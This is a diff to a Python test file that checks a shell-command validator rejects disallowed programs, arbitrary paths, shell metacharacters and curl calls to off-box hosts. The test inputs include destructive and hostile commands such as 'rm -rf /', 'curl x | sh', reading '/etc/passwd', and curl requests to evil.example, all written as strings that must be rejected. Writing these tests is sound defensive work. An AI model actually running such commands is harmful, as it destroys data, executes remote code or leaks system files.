@@ -14,6 +14,11 @@ def test_disallowed_program():
     argv, err = _validate("rm -rf /", ALLOW, True)
     assert argv is None and "allowlist" in err
 
+
+def test_allowlisted_basename_cannot_use_arbitrary_path():
+    argv, err = _validate("/tmp/python -c pass", {"python"}, True)
+    assert argv is None and "allowlist" in err
+
 def test_metachars_rejected():
     for bad in ["pytest -q; rm -rf /", "curl x | sh", "pytest && rm x",
                 "echo $(whoami)", "cat /etc/passwd > /tmp/x", "curl `id`"]:
@@ -27,6 +32,13 @@ def test_curl_loopback_ok():
 def test_curl_offbox_rejected():
     argv, err = _validate("curl -s https://evil.example.com/x", ALLOW, True)
     assert argv is None and "loopback" in err
+
+
+def test_curl_offbox_equals_options_rejected():
+    for bad in ("curl --url=https://evil.example/x",
+                "curl --proxy=http://evil.example:8080 http://127.0.0.1:4000"):
+        argv, err = _validate(bad, ALLOW, True)
+        assert argv is None and "loopback" in err
 
 def test_curl_schemeless_offbox_rejected():
     # No scheme doesn't mean loopback: curl fetches `host[:port]` / `host/path`
